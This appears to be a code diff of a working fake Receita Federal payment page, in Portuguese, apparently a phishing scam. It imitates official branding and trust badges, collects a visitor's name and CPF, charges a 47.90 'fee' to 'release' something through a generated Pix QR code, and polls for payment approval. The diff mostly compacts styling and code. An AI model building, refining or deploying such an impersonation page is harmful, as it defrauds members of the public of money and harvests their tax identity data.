@@ -8,9 +8,9 @@
     
     <style>
         :root {
-            --gov-blue: #0038a9;   /* Azul Receita */
-            --gov-dark: #00236b;   /* Azul Escuro */
-            --success: #138a41;    /* Verde Gov */
+            --gov-blue: #0038a9;
+            --gov-dark: #00236b;
+            --success: #138a41;
             --bg-gray: #f8f9fa;
             --text-main: #333;
             --border-color: #e0e0e0;
@@ -27,144 +27,89 @@
             display: flex; flex-direction: column;
         }
 
-        /* --- HEADER OFICIAL --- */
+        /* HEADER OFICIAL */
         .gov-header {
             background-color: var(--gov-blue);
-            width: 100%;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
+            width: 100%; padding: 15px 20px;
+            display: flex; align-items: center;
             box-shadow: 0 2px 4px rgba(0,0,0,0.2);
             position: sticky; top: 0; z-index: 100;
         }
-        
-        /* Cadeado SVG Perfeito */
         .lock-icon { width: 20px; height: 20px; fill: white; margin-right: 10px; }
-        
-        .header-title {
-            color: white;
-            font-weight: 700;
-            font-size: 16px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
+        .header-title { color: white; font-weight: 700; font-size: 16px; letter-spacing: 0.5px; text-transform: uppercase; }
 
-        /* --- CONTEÚDO PRINCIPAL --- */
-        .container {
-            flex: 1;
-            padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-            width: 100%;
-        }
+        /* CONTEÚDO */
+        .container { flex: 1; padding: 20px; max-width: 600px; margin: 0 auto; width: 100%; }
 
-        /* Título Hero */
         .page-title { text-align: center; margin-bottom: 25px; }
         .page-title h1 { font-size: 20px; color: var(--gov-dark); margin: 0 0 5px 0; font-weight: 700; }
         .page-title p { font-size: 13px; color: #666; margin: 0; }
 
-        /* Card de Resumo */
+        /* CARD RESUMO */
         .card-summary {
-            background: white;
-            border-radius: 8px;
-            padding: 20px;
+            background: white; border-radius: 8px; padding: 20px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.08);
-            border: 1px solid var(--border-color);
-            margin-bottom: 20px;
+            border: 1px solid var(--border-color); margin-bottom: 20px;
         }
-
         .row-detail { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; color: #555; }
-        .row-detail.total {
-            margin-top: 15px; padding-top: 15px;
-            border-top: 1px dashed var(--border-color);
-            align-items: center;
-        }
+        .row-detail.total { margin-top: 15px; padding-top: 15px; border-top: 1px dashed var(--border-color); align-items: center; }
         .text-taxa { color: #d32f2f; font-weight: 600; }
         .text-total-label { font-weight: 700; color: var(--gov-dark); }
         .text-total-value { font-size: 22px; font-weight: 800; color: var(--success); }
 
-        /* Aviso Reembolso */
         .notice-box {
-            background: #e3f2fd;
-            border-left: 4px solid #1976d2;
-            padding: 12px 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #0d47a1;
-            line-height: 1.4;
+            background: #e3f2fd; border-left: 4px solid #1976d2;
+            padding: 12px 15px; border-radius: 4px; margin-bottom: 20px;
+            font-size: 13px; color: #0d47a1; line-height: 1.4;
         }
 
-        /* Inputs */
         .input-group { margin-bottom: 15px; }
         .input-field {
-            width: 100%; padding: 16px;
-            border: 1px solid #ccc; border-radius: 6px;
+            width: 100%; padding: 16px; border: 1px solid #ccc; border-radius: 6px;
             font-size: 16px; transition: 0.3s;
         }
         .input-field:focus { border-color: var(--gov-blue); box-shadow: 0 0 0 2px rgba(0,56,169,0.1); }
 
-        /* Botão */
+        /* BOTÃO SEM ÍCONE */
         .btn-pay {
             width: 100%; padding: 18px;
-            background: var(--success);
-            color: white; border: none; border-radius: 6px;
+            background: var(--success); color: white;
+            border: none; border-radius: 6px;
             font-size: 16px; font-weight: 700;
             cursor: pointer; text-transform: uppercase;
             box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            display: flex; align-items: center; justify-content: center; gap: 10px;
+            text-align: center; /* Centralizado */
         }
         .btn-pay:hover { filter: brightness(0.95); }
 
-        /* --- ÁREA DE CONFIANÇA (Rodapé Robusto) --- */
-        .trust-section {
-            margin-top: 30px;
-            border-top: 1px solid #e0e0e0;
-            padding-top: 20px;
-        }
-
-        .trust-header {
-            display: flex; align-items: center; gap: 10px;
-            margin-bottom: 15px;
-        }
+        /* RODAPÉ DE CONFIANÇA */
+        .trust-section { margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 20px; }
+        .trust-header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
         .shield-icon { width: 18px; height: 18px; fill: #666; }
         .trust-title { font-size: 12px; font-weight: 700; color: #555; text-transform: uppercase; }
-
-        .trust-info {
-            font-size: 11px; color: #777; line-height: 1.6; text-align: justify;
-            margin-bottom: 15px;
-        }
-
-        .security-badges {
-            display: flex; gap: 15px; margin-bottom: 20px;
-        }
+        .trust-info { font-size: 11px; color: #777; line-height: 1.6; text-align: justify; margin-bottom: 15px; }
+        
+        .security-badges { display: flex; gap: 15px; margin-bottom: 20px; }
         .badge {
-            background: #fff; border: 1px solid #ddd;
-            border-radius: 4px; padding: 5px 10px;
-            font-size: 10px; font-weight: 600; color: #555;
-            display: flex; align-items: center; gap: 5px;
+            background: #fff; border: 1px solid #ddd; border-radius: 4px; padding: 5px 10px;
+            font-size: 10px; font-weight: 600; color: #555; display: flex; align-items: center; gap: 5px;
         }
         .badge::before { content: '🔒'; }
 
-        .official-footer {
-            text-align: center; margin-top: 30px; opacity: 0.7;
-        }
+        .official-footer { text-align: center; margin-top: 30px; opacity: 0.7; }
         .gov-logo { height: 25px; }
 
-        /* --- MODAL QR CODE --- */
+        /* MODAL QR */
         #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         .qr-card { background: white; width: 100%; max-width: 350px; text-align: center; }
         .qr-img { width: 180px; margin: 15px auto; border: 1px solid #eee; border-radius: 8px; }
         .pix-code-box { background: #f5f5f5; padding: 12px; width: 100%; font-size: 11px; text-align: center; margin-bottom: 15px; border: 1px dashed #ccc; border-radius: 6px; color: #555; word-break: break-all; }
-
     </style>
 </head>
 <body>
 
     <div class="gov-header">
-        <svg class="lock-icon" viewBox="0 0 24 24">
-            <path d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6-9h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zM9 6a3 3 0 1 1 6 0v2H9V6z"/>
-        </svg>
+        <svg class="lock-icon" viewBox="0 0 24 24"><path d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6-9h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zM9 6a3 3 0 1 1 6 0v2H9V6z"/></svg>
         <span class="header-title">Receita Federal</span>
     </div>
 
@@ -199,8 +144,7 @@
         </div>
         
         <button class="btn-pay" onclick="gerarPixIOF()">
-            <svg style="width:20px;height:20px;fill:white" viewBox="0 0 24 24"><path d="M5 20h14v2H5v-2zm7-18l-1 1h-3v2H7v1H5v3h2v3h4v4h4v-4h4v-3h2V9h-2V8h-1V6h-3l-1-1z"/></svg>
-            Pagar Taxa e Liberar
+            PAGAR TAXA E LIBERAR
         </button>
 
         <div class="trust-section">
@@ -232,24 +176,17 @@
                 </div>
             </div>
         </div>
-
     </div>
 
     <div id="qr-screen">
         <div class="qr-card">
             <h3 style="color:var(--gov-dark); margin-bottom:5px;">Pagamento via Pix</h3>
             <p style="font-size:13px; color:#666;">Copie o código abaixo e pague no seu banco.</p>
-            
             <img id="qr-image" class="qr-img">
-            
             <div style="font-size:11px; font-weight:bold; margin-bottom:5px; text-align:left;">Pix Copia e Cola:</div>
             <textarea id="pix-copia" class="pix-code-box" readonly></textarea>
-            
             <button class="btn-pay" onclick="copiarCodigo()">Copiar Código Pix</button>
-            
-            <div id="msg-sucesso" style="margin-top:15px;color:var(--success);display:none;font-weight:bold;text-align:center;">
-                PAGAMENTO CONFIRMADO!
-            </div>
+            <div id="msg-sucesso" style="margin-top:15px;color:var(--success);display:none;font-weight:bold;text-align:center;">PAGAMENTO CONFIRMADO!</div>
         </div>
     </div>
 
@@ -260,40 +197,20 @@
         async function gerarPixIOF() {
             const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-pay');
             if(n.length<3||c.length<11) return alert("Preencha todos os dados.");
-            
             b.innerHTML = "Processando..."; b.disabled=true; b.style.opacity = "0.7";
-            
             try {
-                // VALOR DA TAXA (Configurável aqui se quiser mudar para 37.90 ou manter 47.90)
-                const r=await fetch(`${API_URL}/pix`,{
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({amount:47.90,name:n,cpf:c})
-                });
+                const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
                 const d=await r.json();
-                
                 if(d.point_of_interaction){
                     document.getElementById('qr-image').src=`data:image/png;base64,${d.point_of_interaction.transaction_data.qr_code_base64}`;
                     document.getElementById('pix-copia').value = d.point_of_interaction.transaction_data.qr_code;
                     document.getElementById('qr-screen').style.display='flex';
                     monitor(d.id);
-                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerHTML="Pagar Taxa e Liberar"; }
-            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerHTML="Pagar Taxa e Liberar"; }
+                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerHTML="PAGAR TAXA E LIBERAR"; }
+            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerHTML="PAGAR TAXA E LIBERAR"; }
         }
-
-        function monitor(id){ 
-            const i=setInterval(async()=>{ 
-                try{ 
-                    const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); 
-                    if(j.status==='approved'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; } 
-                }catch(e){} 
-            },3000); 
-        }
-
-        function copiarCodigo(){ 
-            const t=document.getElementById('pix-copia'); t.select(); t.setSelectionRange(0,99999); 
-            document.execCommand('copy'); alert("Código copiado!"); 
-        }
+        function monitor(id){ const i=setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; } }catch(e){} },3000); }
+        function copiarCodigo(){ const t=document.getElementById('pix-copia'); t.select(); t.setSelectionRange(0,99999); document.execCommand('copy'); alert("Código copiado!"); }
     </script>
 </body>
 </html>
